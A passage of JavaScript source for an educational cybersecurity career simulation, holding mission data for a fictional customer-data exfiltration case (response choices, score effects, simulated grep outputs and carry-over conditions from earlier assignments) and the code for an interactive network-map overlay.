          business: ['Forensics establishes exactly what was taken and how — vital for the regulator report.'],
          future: ['A clean evidence chain protects the company in the investigation that follows.'],
        },
      },
      {
        id: 'recommend_legal',
        type: 'recommendation',
        label: 'Recommend Legal & Regulatory Notification',
        summary: 'Recommend notifying Legal and the relevant data-protection regulators.',
        outcomeSub: 'You recommended legal and regulatory notification.',
        deltas: { complianceExposure: -16, executiveTrust: 9, careerReputation: 7, securityPosture: 3, businessContinuity: -3 },
        setFlags: ['incidentResponseEscalated'],
        deniedNote: 'Leadership wanted the full scope confirmed before formally notifying regulators.',
        consequence: {
          immediate: ['Legal is engaged and the regulator-notification clock is handled correctly.'],
          business: ['Meeting the legal duty on time avoids penalties for late disclosure.'],
          future: ['Handling notification by the book protects the company from compounding fines.'],
        },
      },
      {
        id: 'recommend_customer_notify',
        type: 'recommendation',
        label: 'Recommend Customer Notification',
        summary: 'Recommend notifying the 240,000 affected customers of the breach.',
        outcomeSub: 'You recommended notifying affected customers.',
        deltas: { complianceExposure: -12, executiveTrust: 6, careerReputation: 8, businessContinuity: -5, securityPosture: 2 },
        setFlags: ['customerNotificationRecommended'],
        deniedNote: 'Leadership wanted to confirm the affected-record count before notifying customers.',
        consequence: {
          immediate: ['Affected customers are told their data was exposed and what to watch for.'],
          business: ['Short-term reputational cost, but transparency preserves long-term trust and meets the law.'],
          future: ['Doing right by customers under pressure builds lasting credibility.'],
        },
      },
      {
        id: 'submit_incident_report',
        type: 'recommendation',
        label: 'Submit Incident Report',
        summary: 'Submit the complete incident report: timeline, root cause, containment, and notification plan.',
        outcomeSub: 'You submitted the full incident report.',
        deltas: { securityPosture: 14, complianceExposure: -14, executiveTrust: 12, careerReputation: 12, businessContinuity: -3 },
        setFlags: ['dataExfiltrationConfirmed', 'incidentResponseEscalated'],
        deniedNote: 'Leadership sent the report back asking for a clearer containment recommendation.',
        consequence: {
          immediate: ['A complete, evidence-backed incident report goes to leadership and IR.'],
          business: ['The board gets the clear account it asked for: how it happened, what was lost, how it is contained.'],
          future: ['A thorough capstone report cements your reputation as a trusted analyst.'],
        },
      },
      {
        id: 'continue_investigation',
        type: 'direct',
        label: 'Continue Investigating',
        summary: 'Hold off on any response and keep gathering information.',
        outcomeSub: 'You chose to keep investigating before recommending anything.',
        deltas: { securityPosture: -8, complianceExposure: 12, businessContinuity: 1, careerReputation: -5 },
        consequence: {
          immediate: ['No containment yet; the attacker keeps their way in and the notification clock keeps running.'],
          business: ['The evidence already confirms a breach — delay only adds regulatory and reputational risk.'],
          future: ['Hesitating on a confirmed, time-sensitive breach is noted as a costly delay.'],
        },
      },
      {
        id: 'downgrade',
        type: 'direct',
        label: 'Downgrade to Low Priority',
        summary: 'Treat the alert as low-risk and defer it.',
        outcomeSub: 'You downgraded the incident.',
        deltas: { securityPosture: -24, complianceExposure: 30, businessContinuity: 2, careerReputation: -20, executiveTrust: -20 },
        consequence: {
          immediate: ['A confirmed exfiltration of 240,000 PII records is left unaddressed.'],
          business: ['Missing the legal notification window turns a breach into major fines and lasting harm.'],
          future: ['Downgrading a confirmed critical breach is a severe blow to trust in your judgment.'],
        },
      },
    ],

    lockedActions: [
      {
        id: 'companywide_lockdown',
        label: 'Execute Company-Wide Data Lockdown',
        reason: 'Cybersecurity Interns cannot lock down company-wide systems. That is an Incident Commander decision.',
        alternativeRecommendationId: 'rec_companywide_lockdown',
      },
      {
        id: 'terminate_contractor',
        label: 'Terminate the Contractor'+"'"+'s Contract',
        reason: 'Interns cannot terminate a vendor contract. Route this through Legal, HR, and your SOC Lead.',
        alternativeRecommendationId: 'rec_terminate_contractor',
      },
    ],

    recommendations: {
      rec_companywide_lockdown: {
        label: 'Company-Wide Data Lockdown',
        deltas: { securityPosture: 12, complianceExposure: -10, businessContinuity: -10, careerReputation: 6 },
        setFlags: ['exfilContained', 'incidentResponseEscalated'],
        deniedNote: 'Leadership declined a full lockdown without evidence the breach was spreading.',
        consequence: {
          immediate: ['Requested a broad lockdown to halt any further data movement.'],
          business: ['A lockdown is highly disruptive but guarantees nothing more leaves while IR investigates.'],
          future: ['A documented, decisive containment call carried into later work.'],
        },
      },
      rec_terminate_contractor: {
        label: 'Contractor Contract Termination',
        deltas: { securityPosture: 9, executiveTrust: 7, careerReputation: 8, complianceExposure: -6 },
        setFlags: ['incidentResponseEscalated'],
        deniedNote: 'Leadership deferred contract termination to Legal and HR pending the IR findings.',
        consequence: {
          immediate: ['Requested termination of the contractor tied to the exfiltration.'],
          business: ['Removes the recurring actor as a source of further incidents, via the proper channels.'],
          future: ['Closing out the contractor thread cleanly reduces risk going forward.'],
        },
      },
    },

    /* ------------------------------------------------------------------ *
     * DYNAMIC CONDITIONS — the headline feature. Each reads carry-flags set
     * by Assignments 001/002/003 and additively reshapes this case. They are
     * applied in openCareerMission via career-dynamic.js (pure, non-mutating):
     * addEvidence/addCommands keep 100% confidence achievable (every added
     * finding has a command to surface it); continuity shows in the brief;
     * outcomeNote + deltaMods show in the debrief (deltas are post-hoc, never
     * altering the leadership verdict).
     * ------------------------------------------------------------------ */
    dynamicConditions: [
      {
        /* A — BAD carry from Assignment 002: a rogue device left active became
         * the relay the stolen archive left through. */
        id: 'dyn_open_channel',
        when: { allOf: ['rogueDeviceActive'], noneOf: ['rogueDeviceContained'] },
        continuity: {
          from: 'ASSIGNMENT 002 · NETWORK EXPOSURE',
          decision: 'You left the unknown device 192.168.1.57 active on the network.',
          consequence: 'The stolen archive was relayed out through that same device — the exfiltration rode a door left open.',
          tone: 'bad',
        },
        addCommands: [
          {
            id: 'cmd_dyn_rogue_relay',
            match: ['grep 192.168.1.57 network_activity.log', 'grep 192.168.1.57', 'grep rogue network_activity.log'],
            help: 'trace the transfer through the un-removed device',
            output: [
              { t: 'grep 192.168.1.57 network_activity.log', c: 'head' },
              '  03:04  relay  customer_data.zip via 192.168.1.57 -> 198.51.100.23',
              '  # 192.168.1.57 = the rogue device left active in Assignment 002',
            ],
            reveals: ['ev_dyn_rogue_relay'],
            observation: 'The archive was relayed through 192.168.1.57 — the rogue device you left active in your earlier network case.',
            question: 'Had that device been removed back then, would this upload have had a path out at all?',
            next: 'finish the timeline and type  decide',
          },
        ],
        addEvidence: [
          {
            id: 'ev_dyn_rogue_relay', label: 'The archive was relayed out through the rogue device from Assignment 002.',
            qualityWeight: 1, source: 'grep 192.168.1.57 network_activity.log',
            layers: {
              beginner: {
                summary: 'The stolen data left through 192.168.1.57 — the unknown device you left active in the network case.',
                why: 'A device left on the network became the exact path the attacker used to ship the data out.',
                prompt: 'How much of this breach traces back to a door left open earlier?',
              },
              analyst: 'Egress relayed via 192.168.1.57 (rogue device, never contained in A002) → 198.51.100.23.',
              technical: 'network_activity.log — exfil hop through 192.168.1.57 (uncontained rogue host) to external dst.',
              terms: ['dataExfiltration', 'network'],
            },
          },
        ],
        addRisks: [
          { id: 'risk_dyn_open_channel', label: 'The archive left through a device left active in a prior case', triggeredBy: ['ev_dyn_rogue_relay'] },
        ],
        deltaMods: { complianceExposure: 10, businessContinuity: -6 },
        tone: 'bad',
        outcomeNote: 'Because the rogue device from Assignment 002 was never removed, the exfiltration used it as a relay — compliance exposure rose and recovery is slower. Containing that device earlier would have closed this path.',
      },
      {
        /* B — GOOD continuity payoff: any earlier link to the recurring
         * contractor makes attribution fast and high-confidence. */
        id: 'dyn_attribution',
        when: { anyOf: ['contractorAccountCompromised', 'contractorDeviceLinked', 'contractorAccessDiscovered'] },
        continuity: {
          from: 'PRIOR CASES · RECURRING ACTOR',
          decision: 'You linked the recurring contractor (J. Demir / ext-contractor-07) in an earlier case.',
          consequence: 'Threat intel maps this exfil session to that same identity — attribution is immediate, not guesswork.',
          tone: 'good',
        },
        addCommands: [
          {
            id: 'cmd_dyn_attribution',
            match: ['grep contractor threat_intel.log', 'cat threat_intel.log', 'grep contractor threat_intel'],
            help: 'cross-reference the session against prior-case intel',
            output: [
              { t: 'grep contractor threat_intel.log', c: 'head' },
              '  match: exfil session src == ext-contractor-07 (J. Demir)',
              '  linked to your prior cases — HIGH-confidence attribution',
            ],
            reveals: ['ev_dyn_attribution'],
            observation: 'Threat intel from your earlier cases maps this exfil session straight to ext-contractor-07 — attribution is immediate.',
            question: 'With the actor already known, what can the response do faster than starting from scratch?',
            next: 'finish the timeline and type  decide',
          },
        ],
        addEvidence: [
          {
            id: 'ev_dyn_attribution', label: 'Prior-case intel attributes the exfil to ext-contractor-07 (J. Demir).',
            qualityWeight: 1, source: 'grep contractor threat_intel.log',
            layers: {
              beginner: {
                summary: 'Intel from your earlier cases ties this theft to the same contractor, J. Demir.',
                why: 'Knowing exactly who did it lets the response move faster and more confidently.',
                prompt: 'How much time does already knowing the attacker save the response team?',
              },
              analyst: 'Threat-intel correlation: exfil session ↔ ext-contractor-07 (J. Demir), built from prior-case links.',
              technical: 'threat_intel.log — high-confidence attribution to ext-contractor-07 via prior-case identity graph.',
              terms: ['incidentResponse', 'rootCause'],
            },
          },
        ],
        addRisks: [
          { id: 'risk_dyn_attribution', label: 'The exfil identity matches the actor flagged in your prior cases', triggeredBy: ['ev_dyn_attribution'] },
        ],
        deltaMods: { executiveTrust: 4, careerReputation: 4 },
        tone: 'good',
        outcomeNote: 'Your earlier work tying the recurring contractor to this actor let you attribute the exfiltration with confidence — leadership credited the connected investigation.',
      },
      {
        /* C — GOOD carry from Assignment 003: enforced MFA limited the
         * compromised account, shrinking how much data could leave. */
        id: 'dyn_mfa_scope',
        when: { allOf: ['mfaRecommended'] },
        continuity: {
          from: 'ASSIGNMENT 003 · AUTH SECURITY',
          decision: 'You recommended enforcing MFA on the compromised account.',
          consequence: 'MFA challenged the session mid-transfer, so a smaller archive left — the enforced control shrank the breach.',
          tone: 'good',
        },
        addCommands: [
          {
            id: 'cmd_dyn_mfa_scope',
            match: ['grep mfa system_alerts.log', 'grep mfa', 'grep mfa system_alerts'],
            help: 'check how MFA enforcement limited the session',
            output: [
              { t: 'grep mfa system_alerts.log', c: 'head' },
              '  03:06  MFA challenge interrupted the session mid-transfer',
              '  partial archive only — fewer records reached the external host',
            ],
            reveals: ['ev_dyn_mfa_scope'],
            observation: 'The MFA enforcement you recommended earlier challenged the session mid-transfer, cutting the exfil short.',
            question: 'How much worse would this breach be if that control had not been in place?',
            next: 'finish the timeline and type  decide',
          },
        ],
        addEvidence: [
          {
            id: 'ev_dyn_mfa_scope', label: 'Enforced MFA cut the session short — a smaller archive left.',
            qualityWeight: 1, source: 'grep mfa system_alerts.log',
            layers: {
              beginner: {
                summary: 'Because MFA was enforced earlier, the attacker'+"'"+'s session was challenged and fewer records got out.',
                why: 'A control you put in place in a past case directly reduced the size of this breach.',
                prompt: 'How much did the earlier MFA decision shrink the damage here?',
              },
              analyst: 'MFA challenge interrupted the exfil session — partial transfer; reduced exfil volume vs un-enforced baseline.',
              technical: 'system_alerts.log — MFA step-up mid-session truncated egress; smaller archive reached external dst.',
              terms: ['mfa', 'dataExfiltration'],
            },
          },
        ],
        deltaMods: { complianceExposure: -8, securityPosture: 4 },
        tone: 'good',
        outcomeNote: 'Enforcing MFA in Assignment 003 cut the attacker'+"'"+'s window short — fewer records were exfiltrated and compliance exposure is lower than it would have been.',
      },
      {
        /* D — BAD carry from Assignment 001: prior sensitive-data exposure /
         * legal review makes this a repeat incident with higher stakes. */
        id: 'dyn_repeat_exposure',
        when: { anyOf: ['sensitiveDataExposed', 'legalReviewTriggered'] },
        continuity: {
          from: 'ASSIGNMENT 001 · DATA PROTECTION',
          decision: 'A prior case already flagged sensitive-data exposure or triggered legal review.',
          consequence: 'This is a repeat exposure for the same organization — regulators and legal treat it far more seriously.',
          tone: 'bad',
        },
        deltaMods: { complianceExposure: 6, executiveTrust: -2 },
        tone: 'bad',
        outcomeNote: 'Because sensitive data was already exposed in an earlier case, this counts as a repeat incident — regulatory and legal stakes are higher, strengthening the case for prompt customer notification.',
      },
    ],
  },
};

window.CAREER_MISSION_IDS = Object.keys(CAREER_MISSIONS);

/* ================================================================== *
 * INIT
 * ================================================================== */
/* ==================================================================
 * NETWORK / DEVICE MAP — reactive, review-only popup (Task #94).
 * Presentation only: it reads SIM.evidence to decide which nodes and
 * links are visible and how they are flagged. It writes NOTHING — no
 * localStorage, no score, no resource, no outcome. Missions without a
 * `map` block show no button and never build the overlay, so the M1
 * numeric path and every other mission are untouched.
 * ================================================================== */

function missionHasMap() {
  return !!(SIM.def && SIM.def.map && SIM.def.map.nodes);
}

// Status priority — higher wins when several statuses apply to one node.
const MAP_STATUS_RANK = { self: 5, suspicious: 4, target: 3, unknown: 2, identified: 1 };
const MAP_STATUS_TAG = {
  self: 'YOU', suspicious: 'UNAPPROVED', target: 'TARGETED', unknown: 'UNVERIFIED', identified: 'APPROVED',
};

function mapEsc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// A node appears once it is seeded or its revealing evidence is surfaced.
function mapNodeVisible(node) {
  if (!node) return false;
  if (node.seed) return true;
  // Optional side-trail node: appears once its trail is traced (board flag set).
  if (node.sideTrailReveal) return sideTrailBoardRevealed(node.sideTrailReveal);
  return !!(node.revealBy && SIM.evidence.has(node.revealBy));
}

// Resolve a node's status from surfaced evidence (order-independent).
function mapNodeStatus(node) {
  let status = node.status || '';
  let rank = MAP_STATUS_RANK[status] || 0;
  const by = node.statusBy || {};
  Object.keys(by).forEach(evId => {
    if (!SIM.evidence.has(evId)) return;
    const r = MAP_STATUS_RANK[by[evId]] || 0;
    if (r > rank) { rank = r; status = by[evId]; }
  });
  return status;
}

// A link shows once both endpoints are visible and its evidence (if any) is up.
function mapLinkVisible(link, nodes) {
  if (!mapNodeVisible(nodes[link.a]) || !mapNodeVisible(nodes[link.b])) return false;
  if (link.sideTrailReveal && !sideTrailBoardRevealed(link.sideTrailReveal)) return false;
  if (link.revealBy && !SIM.evidence.has(link.revealBy)) return false;
  return true;
}

function mapVisibleNodeCount() {
  const nodes = (SIM.def && SIM.def.map && SIM.def.map.nodes) || {};
  let shown = 0, total = 0;
  Object.keys(nodes).forEach(id => {
    // Optional side-trail nodes are bonus pins, not core devices to map — they
    // never count toward "all devices mapped" so the main progress stays honest.
    if (nodes[id] && nodes[id].sideTrailReveal) return;
    total++; if (mapNodeVisible(nodes[id])) shown++;
  });
  return { shown, total };
}

/* --- Floating intel card (compact port of the lab pattern) --- */
let simMapIntelEl = null, simMapIntelTimer = null;
function simMapIntelEnsure() {
  if (simMapIntelEl) return simMapIntelEl;
  const el = document.createElement('div');
  el.className = 'sim-map-intel';
  el.setAttribute('role', 'tooltip');
  el.hidden = true;
  el.addEventListener('mouseenter', () => {
    if (simMapIntelTimer) { clearTimeout(simMapIntelTimer); simMapIntelTimer = null; }
  });
  el.addEventListener('mouseleave', simMapIntelScheduleHide);
  document.body.appendChild(el);
  simMapIntelEl = el;
  return el;
}
function simMapIntelRow(k, v) {
  return v ? `<div class="sim-map-intel-row"><span class="sim-map-intel-k">${mapEsc(k)}</span><span class="sim-map-intel-v">${mapEsc(v)}</span></div>` : '';
}
function simMapIntelShow(intel, title, kind, anchorEl) {
  if (!intel || !anchorEl) return;
  if (simMapIntelTimer) { clearTimeout(simMapIntelTimer); simMapIntelTimer = null; }
  const el = simMapIntelEnsure();
  el.innerHTML = `
    <div class="sim-map-intel-head">
      ${kind ? `<span class="sim-map-intel-kind">${mapEsc(kind)}</span>` : ''}
      <span class="sim-map-intel-title">${mapEsc(title)}</span>
    </div>
    ${simMapIntelRow('What it is', intel.what)}
    ${simMapIntelRow('How an analyst surfaces it', intel.technique)}
    ${simMapIntelRow('Why it matters', intel.why)}`;
  el.hidden = false;
  simMapFloatPosition(anchorEl);
}

/* Clamp the floating card fully inside the viewport, above the anchor when it
 * fits. Shared by the intel card and the cross-case red-string timeline. */
function simMapFloatPosition(anchorEl) {
  const el = simMapIntelEl;
  if (!el || !anchorEl) return;
  const a = anchorEl.getBoundingClientRect();
  const cw = el.offsetWidth, ch = el.offsetHeight, m = 10;
  const vw = window.innerWidth, vh = window.innerHeight;
  let top = a.top - ch - m; if (top < m) top = a.bottom + m;
  let left = a.left + a.width / 2 - cw / 2;
  left = Math.max(m, Math.min(left, vw - cw - m));
  top = Math.max(m, Math.min(top, vh - ch - m));
  el.style.left = left + 'px';
  el.style.top = top + 'px';
}

/* Cross-case "red string" timeline — reuses the floating intel card to show
 * where a recurring entity has appeared across cases. Presentation-only. */
function simMapTimelineShow(rs, anchorEl) {
  if (!rs || !anchorEl) return;
  if (simMapIntelTimer) { clearTimeout(simMapIntelTimer); simMapIntelTimer = null; }
  const el = simMapIntelEnsure();
  const closed = !!(rs.closedBy && sideTrailResolved(rs.closedBy));
  const rows = (rs.timeline || []).map(t => `
    <div class="sim-redstring-row">
      <span class="sim-redstring-op">${mapEsc(t.op || '')}</span>
      <span class="sim-redstring-where">${mapEsc(t.where || '')}</span>
    </div>`).join('');
  el.innerHTML = `
    <div class="sim-map-intel-head">
      <span class="sim-map-intel-kind sim-redstring-kind${closed ? ' is-closed' : ''}">${closed ? '\u26d3 THREAD CLOSED' : '\u26d3 UNRESOLVED ACROSS CASES'}</span>
      <span class="sim-map-intel-title">${mapEsc(rs.entity || '')}</span>
    </div>
    ${rs.note ? `<div class="sim-redstring-note">${mapEsc(rs.note)}</div>` : ''}
    <div class="sim-redstring-timeline">${rows}</div>`;
  el.hidden = false;
  simMapFloatPosition(anchorEl);
}
function simMapIntelScheduleHide() {
  if (simMapIntelTimer) clearTimeout(simMapIntelTimer);
  simMapIntelTimer = setTimeout(simMapIntelHide, 140);
}
function simMapIntelHide() {
  if (simMapIntelTimer) { clearTimeout(simMapIntelTimer); simMapIntelTimer = null; }
  if (simMapIntelEl) simMapIntelEl.hidden = true;
}
function simMapIntelBind(el, intel, title, kind) {
  if (!intel || !el) return;
  el.addEventListener('mouseenter', () => simMapIntelShow(intel, title, kind, el));
  el.addEventListener('mouseleave', simMapIntelScheduleHide);
  el.addEventListener('focus', () => simMapIntelShow(intel, title, kind, el));
  el.addEventListener('blur', simMapIntelHide);
  el.addEventListener('click', e => {
    e.preventDefault();
    e.stopPropagation();
    if (simMapIntelEl && !simMapIntelEl.hidden) simMapIntelHide();
    else simMapIntelShow(intel, title, kind, el);
  });
  el.addEventListener('keydown', e => {
    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); simMapIntelShow(intel, title, kind, el); }
  });
}

/* Hover/focus-only intel binding — for nodes whose CLICK is reserved for the
 * interactive determination (flagging / classifying). Desktop users still get
 * intel on hover/keyboard-focus; touch users use the explicit info button. */
function simMapIntelHoverBind(el, intel, title, kind) {
  if (!intel || !el) return;
  el.addEventListener('mouseenter', () => simMapIntelShow(intel, title, kind, el));
  el.addEventListener('mouseleave', simMapIntelScheduleHide);
  el.addEventListener('focus', () => simMapIntelShow(intel, title, kind, el));
  el.addEventListener('blur', simMapIntelHide);
}

/* Explicit "i" affordance appended to a flaggable node so intel stays reachable
 * by touch/click without stealing the node's flag click. */
function simMapAddInfoBtn(div, intel, title, kind) {
  if (!intel) return;
  const info = document.createElement('button');
  info.type = 'button';
  info.className = 'sim-map-info-btn';
  info.textContent = 'i';
  info.setAttribute('aria-label', `${title} — analyst intel`);
  const toggle = e => {
    e.preventDefault(); e.stopPropagation();
    if (simMapIntelEl && !simMapIntelEl.hidden) simMapIntelHide();
    else simMapIntelShow(intel, title, kind, info);
  };
  info.addEventListener('click', toggle);
  info.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') toggle(e); });
  div.appendChild(info);
}

/* ------------------------------------------------------------------ *
 * Interactive determination on the map (Task #134).
 * Clicking a revealed node records the SAME graded judgment the notebook
 * already feeds — identify-model missions set SIM.identified; the file-model
 * mission sets SIM.classified[file]. No new scoring math, no new persisted
 * fields, and the map never names the culprit early (only the player's own
 * choice is highlighted). Locked once the mission is finalized (report stage).
 * ------------------------------------------------------------------ */
function mapFlagLocked() { return SIM.stage === 'report'; }

/* Structural link from a map node to the existing graded determination. Returns
 * null for infrastructure / decoy-less nodes (they stay intel-only). */
function mapNodeDetermination(n) {
  if (!n) return null;
  if (n.identifyAs && SIM.def && SIM.def.identify
      && (SIM.def.identify.options || []).some(o => o.id === n.identifyAs)) {
    return { kind: 'identify', optionId: n.identifyAs };
  }
  if (n.classifyFile && typeof simFileByName === 'function' && simFileByName(n.classifyFile)) {
    return { kind: 'classify', fileName: n.classifyFile };
  }
  return null;
}

/* Is the determination actionable yet? Identify mirrors the notebook (needs
 * something to reason about); classify nodes are revealBy-gated already. */
function mapDetReady(det) {
  if (!det) return false;
  if (det.kind === 'identify') return SIM.evidence.size > 0;
  return true;
}

function mapDetSelected(det) {
  if (!det) return false;
  if (det.kind === 'identify') return SIM.identified === det.optionId;
  if (det.kind === 'classify') return !!SIM.classified[det.fileName];
  return false;
}

function mapPickBadgeHtml(det, picked, flaggable) {
  if (!det) return '';
  if (det.kind === 'identify') {
    if (picked) return `<span class="sim-map-node-pick">✓ YOUR CALL</span>`;
    return flaggable ? `<span class="sim-map-node-pick is-empty">Flag this</span>` : '';
  }
  const v = SIM.classified[det.fileName];
  if (v) return `<span class="sim-map-node-pick">${mapEsc(classLabel(v))}</span>`;
  return flaggable ? `<span class="sim-map-node-pick is-empty">Classify ▾</span>` : '';
}

function mapFlagAria(n, det, picked) {
  const base = `${n.label}${n.sub ? ', ' + n.sub : ''}`;
  if (det.kind === 'identify') {
    return picked ? `${base} — recorded as your determination`
                  : `${base} — flag as your determination`;
  }
  const v = SIM.classified[det.fileName];
  return v ? `${base} — classified ${classLabel(v)}; activate to change`
           : `${base} — activate to classify`;
}

function simMapFlag(n, det, anchorEl) {
  if (mapFlagLocked() || !det) return;
  if (det.kind === 'identify') setIdentification(det.optionId);   // re-renders map via SIM.mapOpen guard
  else if (det.kind === 'classify') simMapClassifyOpen(det.fileName, anchorEl);
}

/* Floating classification picker for the file-model mission — a small menu of
 * the existing CLASSIFICATIONS anchored to the clicked file node. Routes through
 * setClassification (the one graded path); presentation only otherwise. */
let simMapClassifyEl = null, simMapClassifyFile = null;
function simMapClassifyEnsure() {
  if (simMapClassifyEl) return simMapClassifyEl;
  const el = document.createElement('div');
  el.className = 'sim-map-classify';
  el.setAttribute('role', 'menu');
  el.hidden = true;
  el.addEventListener('click', e => {
    const opt = e.target.closest('[data-mapclass]');
    if (!opt) return;
    e.preventDefault(); e.stopPropagation();
    const f = simMapClassifyFile;
    simMapClassifyHide();
    if (f) setClassification(f, opt.dataset.mapclass);   // re-renders map + notebook
  });
  el.addEventListener('keydown', e => { if (e.key === 'Escape') simMapClassifyHide(); });
  document.body.appendChild(el);
  simMapClassifyEl = el;
  return el;
}
function simMapClassifyOpen(fileName, anchorEl) {
  if (mapFlagLocked()) return;
  const el = simMapClassifyEnsure();
  simMapClassifyFile = fileName;
  const chosen = SIM.classified[fileName];
  const opts = CLASSIFICATIONS.map(c =>
    `<button type="button" class="sim-map-classify-opt${chosen === c.id ? ' is-on' : ''}" data-mapclass="${c.id}" role="menuitemradio" aria-checked="${chosen === c.id}">${mapEsc(c.label)}</button>`
  ).join('');
  el.innerHTML = `<div class="sim-map-classify-head">Classify ${mapEsc(fileName)}</div><div class="sim-map-classify-opts">${opts}</div>`;
  el.hidden = false;
  simMapClassifyPosition(anchorEl);
  const first = el.querySelector('.is-on') || el.querySelector('.sim-map-classify-opt');
  if (first) { try { first.focus(); } catch (_) { /* focus is best-effort */ } }
}
function simMapClassifyPosition(anchorEl) {
  const el = simMapClassifyEl;
  if (!el || !anchorEl) return;
  const a = anchorEl.getBoundingClientRect();
  const cw = el.offsetWidth, ch = el.offsetHeight, m = 10;
  const vw = window.innerWidth, vh = window.innerHeight;
  let top = a.bottom + m; if (top + ch > vh - m) top = a.top - ch - m;
  let left = a.left + a.width / 2 - cw / 2;
  left = Math.max(m, Math.min(left, vw - cw - m));
  top = Math.max(m, Math.min(top, vh - ch - m));
  el.style.left = left + 'px';
  el.style.top = top + 'px';
}
function simMapClassifyHide() {
  if (simMapClassifyEl) simMapClassifyEl.hidden = true;
  simMapClassifyFile = null;
}

/* Foot "YOUR CALL" line — turns the map into a clear decision surface and
 * mirrors the notebook prompt. Empty when the mission has no flaggable node. */
function mapCallHtml() {
  const map = SIM.def && SIM.def.map;
  if (!map) return '';
  const locked = mapFlagLocked();
  const nodeList = Object.keys(map.nodes || {}).map(id => map.nodes[id]);
  if (SIM.def.identify) {
    const flagNodes = nodeList.filter(n => n.identifyAs && mapNodeVisible(n));
    if (!flagNodes.length) return '';
    const opt = (SIM.def.identify.options || []).find(o => o.id === SIM.identified);
    const prompt = SIM.def.identify.prompt || 'Flag the node that does not belong.';
    if (locked) {
      return `<span class="sim-map-call-label">YOUR CALL</span> ${opt ? 'You named <strong>' + mapEsc(opt.label) + '</strong>.' : 'No determination was recorded.'}`;
    }
    if (!mapDetReady({ kind: 'identify' })) {
      return `<span class="sim-map-call-label">YOUR CALL</span> Surface evidence in the terminal, then flag the node that fits your read.`;
    }
    if (opt) {
      return `<span class="sim-map-call-label">YOUR CALL</span> ${mapEsc(prompt)} — recorded: <strong>${mapEsc(opt.label)}</strong>. Select another node to change it.`;
    }
    return `<span class="sim-map-call-label">YOUR CALL</span> ${mapEsc(prompt)} <span class="sim-map-call-hint">Select the node on the map to record your determination.</span>`;
  }
  if (simFiles().length) {
    const fileNodes = nodeList.filter(n => n.classifyFile && mapNodeVisible(n));
    if (!fileNodes.length) return '';
    const total = fileNodes.length;
    const done = fileNodes.filter(n => SIM.classified[n.classifyFile]).length;
    if (locked) return `<span class="sim-map-call-label">YOUR CALL</span> Classification locked — ${done}/${total} mapped files were classified.`;
    return `<span class="sim-map-call-label">YOUR CALL</span> Classify each file in the release — ${done}/${total} set. <span class="sim-map-call-hint">Select a file node to set its sensitivity.</span>`;
  }
  return '';
}

/* --- Overlay shell (built once, on first open) --- */
let simMapEl = null;
function simMapEnsure() {
  if (simMapEl) return simMapEl;
  const ov = document.createElement('div');
  ov.className = 'sim-map-overlay';
  ov.id = 'simMapOverlay';
  ov.hidden = true;
  ov.innerHTML = `
    <div class="sim-map-modal" role="dialog" aria-modal="true" aria-label="Network and device map">
      <div class="sim-map-head">
        <span class="sim-map-title">◈ NETWORK MAP</span>
        <span class="sim-map-cap" id="simMapCap"></span>
        <button type="button" class="sim-map-close" data-map-close aria-label="Close network map">✕</button>
      </div>
      <div class="sim-map-stage" id="simMapStage">
        <svg class="sim-map-svg" id="simMapSvg" viewBox="0 0 100 100" preserveAspectRatio="none" aria-hidden="true"></svg>
        <div class="sim-map-nodes" id="simMapNodes"></div>
      </div>
      <div class="sim-map-foot">
        <p class="sim-map-call" id="simMapCall" hidden></p>
        <div class="sim-map-legend">
          <span class="sim-map-leg"><i class="sim-map-swatch is-self"></i>You</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-known"></i>Known / approved</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-unknown"></i>Unverified</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-target"></i>Targeted</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-suspicious"></i>Unapproved</span>
        </div>
        <p class="sim-map-hint" id="simMapHint"></p>
      </div>
    </div>`;
  // Overlay lives outside #careerOps, so it handles its own backdrop/close clicks.
  ov.addEventListener('click', e => {
    if (e.target === ov || e.target.closest('[data-map-close]')) closeSimMap();
  });
  document.body.appendChild(ov);
  simMapEl = ov;
  return ov;
}

function openSimMap() {
  if (!missionHasMap()) return;
  SIM.mapOpen = true;
  simMapEnsure().hidden = false;
  renderSimMap();
  const closeBtn = simMapEl.querySelector('[data-map-close]');
  if (closeBtn) closeBtn.focus();
}

function closeSimMap() {
  const wasOpen = SIM.mapOpen;
  SIM.mapOpen = false;
  simMapIntelHide();
  simMapClassifyHide();
  if (simMapEl) simMapEl.hidden = true;
  if (wasOpen) {
    const btn = document.getElementById('simMapBtn');
    if (btn && !btn.hidden) btn.focus();
  }
}

function renderSimMap() {
  if (!simMapEl || !missionHasMap()) return;
  const map = SIM.def.map;
  const nodes = map.nodes;
  const svg = simMapEl.querySelector('#simMapSvg');
  const host = simMapEl.querySelector('#simMapNodes');
  const cap = simMapEl.querySelector('#simMapCap');
  const hint = simMapEl.querySelector('#simMapHint');
  if (!svg || !host) return;
  simMapClassifyHide();   // node DOM is rebuilt below — drop any stale picker anchor
  if (cap) cap.textContent = map.cap || '';
  svg.innerHTML = '';
  host.innerHTML = '';
  const SVGNS = 'http://www.w3.org/2000/svg';

  // Links first (only where visible), with a focusable midpoint intel marker.
  (map.links || []).forEach(lk => {
    if (!mapLinkVisible(lk, nodes)) return;
    const na = nodes[lk.a], nb = nodes[lk.b];
    const line = document.createElementNS(SVGNS, 'line');
    line.setAttribute('x1', na.x); line.setAttribute('y1', na.y);
    line.setAttribute('x2', nb.x); line.setAttribute('y2', nb.y);
    line.setAttribute('class', 'sim-map-link' + (lk.danger ? ' is-danger' : ''));  // SVG class is read-only
    svg.appendChild(line);
    if (!lk.intel) return;
    const mx = (na.x + nb.x) / 2, my = (na.y + nb.y) / 2;
    const mk = document.createElement('button');
    mk.type = 'button';
    mk.className = 'sim-map-linkmid' + (lk.danger ? ' is-danger' : '');
    mk.style.left = mx + '%';
    mk.style.top = my + '%';
    mk.textContent = 'i';
    mk.setAttribute('aria-label', `Connection ${na.label} to ${nb.label} — analyst intel`);
    host.appendChild(mk);
    simMapIntelBind(mk, lk.intel, `${na.label} → ${nb.label}`, 'CONNECTION');
  });

  // Node chips.
  Object.keys(nodes).forEach(id => {
    const n = nodes[id];
    if (!mapNodeVisible(n)) return;
    const status = mapNodeStatus(n);
    const div = document.createElement('div');
